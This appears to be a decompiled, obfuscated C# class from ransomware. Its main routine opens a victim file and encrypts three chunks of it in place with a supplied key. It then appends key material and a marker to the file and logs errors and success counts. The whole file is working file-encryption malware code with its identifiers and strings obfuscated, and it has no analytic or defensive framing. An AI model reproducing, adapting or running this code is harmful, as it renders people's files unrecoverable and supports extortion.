using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XozMYjSIalY;

namespace fAuBSMaVICral;

internal sealed class EBBCbHTQPFk
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int tfBexGvdFWCeIBkZD(long long_0)
	{
		return (int)long_0;
	}

	public static bool RLENGbvKOVkQ(string QpGbVNfJIsTiEjkh, string dluYztFBVzdTn, string sGIZdrXKvKjnilh, byte[] kNuxRxUpPSvlL = null, byte[] BBAYQfUUXPRvig = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(QpGbVNfJIsTiEjkh, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = tfBexGvdFWCeIBkZD(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(dluYztFBVzdTn) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(dluYztFBVzdTn) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(dluYztFBVzdTn) * 1024 * 1024) / 10;
				}
				int tdFYiEauSjrhE = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = EojTXZsYWfkD(QpGbVNfJIsTiEjkh, fileStream, tdFYiEauSjrhE, num * i);
					array = (YpCGOwjDWwATs.ZdrpEPuTKVdNM ? ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(sGIZdrXKvKjnilh), BBAYQfUUXPRvig) : kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(sGIZdrXKvKjnilh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					sUHrmjaLkZhELU(QpGbVNfJIsTiEjkh, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (YpCGOwjDWwATs.JsBIHINLdKrOq ? Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107460649)) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461633)) + Convert.ToString(dluYztFBVzdTn) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461633))) : Encoding.ASCII.GetBytes(YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107460649)) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461610)) + Convert.ToString(dluYztFBVzdTn) + YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107461610))));
			if (!YpCGOwjDWwATs.JsBIHINLdKrOq)
			{
				using FileStream fileStream2 = new FileStream(QpGbVNfJIsTiEjkh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(QpGbVNfJIsTiEjkh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(kNuxRxUpPSvlL, 0, kNuxRxUpPSvlL.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (YpCGOwjDWwATs.IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(YpCGOwjDWwATs.kZGwVMpcMFQGdu, getString_0(107349281) + QpGbVNfJIsTiEjkh + getString_0(107460636) + ex.Message + getString_0(107396714));
				}
				catch (Exception)
				{
				}
			}
			YpCGOwjDWwATs.YZVmksVDGrCDMh++;
			return false;
		}
		YpCGOwjDWwATs.iRDeCsZxbW++;
		return true;
	}

	public static byte[] EojTXZsYWfkD(string mHGthkDqFmho, FileStream dcGpjiqZNSvJ, int TdFYiEauSjrhE, int bkCtkgsuYuxyzxK = 0)
	{
		byte[] array = new byte[TdFYiEauSjrhE];
		dcGpjiqZNSvJ.Position = bkCtkgsuYuxyzxK;
		dcGpjiqZNSvJ.Read(array, 0, TdFYiEauSjrhE);
		return array;
	}

	public static void sUHrmjaLkZhELU(string GzkyxrAOJgx, FileStream BjXhpsAWzQYoHW, byte[] kwOKfRhRCuwGy, int dqQpcMQLQLVyC = 0)
	{
		BjXhpsAWzQYoHW.Position = dqQpcMQLQLVyC;
		BjXhpsAWzQYoHW.Write(kwOKfRhRCuwGy, 0, kwOKfRhRCuwGy.Length);
	}

	static EBBCbHTQPFk()
	{
		Strings.CreateGetStringDelegate(typeof(EBBCbHTQPFk));
	}
}
